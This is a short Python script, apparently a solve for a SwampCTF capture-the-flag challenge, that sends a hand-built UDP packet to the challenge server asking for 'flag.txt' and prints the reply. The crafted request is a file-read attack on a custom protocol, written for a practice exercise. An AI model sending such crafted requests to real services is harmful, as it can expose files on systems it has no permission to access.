#!/usr/bin/env python3

import socket

server = "chals.swampctf.com"
port = 44254

# 02 command request
# 08 command length
# command payload
payload = b"\x02\x08\x66\x6c\x61\x67\x2e\x74\x78\x74"

# UDP protocol
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

_ = s.sendto(payload, (server, port))

response, addr = s.recvfrom(4096)

print(f"response: {response.decode(errors='ignore')}")

s.close()
